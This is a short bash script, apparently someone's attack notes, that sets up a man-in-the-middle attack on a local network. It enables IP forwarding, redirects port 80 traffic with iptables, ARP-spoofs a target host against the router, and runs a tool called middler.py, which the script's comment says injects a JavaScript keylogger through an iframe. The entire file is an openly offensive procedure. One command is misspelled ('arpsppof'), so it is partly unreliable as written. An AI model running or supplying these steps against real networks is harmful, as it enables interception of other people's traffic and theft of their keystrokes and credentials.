#!/bin/bash

# middler javascript keylogger with iframe

# ip forwarding
cat /proc/sys/net/ipv4/ip_forward

# echo ip forwarding on
echo "1" > /proc/sys/net/ipv4/ip_forward

# iptables
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 80

# check apache isnt running and listen on port 80 on attacking machine

# arp spoof - man in the middle

arpsppof -i wlan0 -t 192.168.1.9 192.168.1.1

# -i wlan0 = interface
# -t 192.168.1.9 = target ip address
# 192.168.1.1 = router


# run middler
sudo python ./middler.py 





